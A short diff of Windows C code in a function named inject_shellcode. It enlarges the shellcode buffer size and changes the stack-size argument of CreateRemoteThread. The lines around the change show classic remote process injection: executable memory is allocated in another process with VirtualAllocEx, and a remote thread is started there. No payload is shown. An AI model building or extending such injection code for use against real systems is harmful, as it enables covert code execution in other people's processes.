@@ -74,7 +74,7 @@ void inject_shellcode(HANDLE hProcess)
 	SIZE_T shellcode_size = shellcode_s;
 
 	LPVOID addr = (LPVOID)addr_word;
-	shellcode_size = 6;
+	shellcode_size = 1000;
 
 	int i = 0xCC;
 	int* p = (int*)VirtualAllocEx(hProcess, NULL, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -90,7 +90,7 @@ void inject_shellcode(HANDLE hProcess)
 		return;
 	}
 
-	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, NULL);
+	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0x1000, (LPTHREAD_START_ROUTINE)p, NULL, 0, NULL);
 	if (!hThread) {
 		printf("Create remote thread failed \n");
 	}
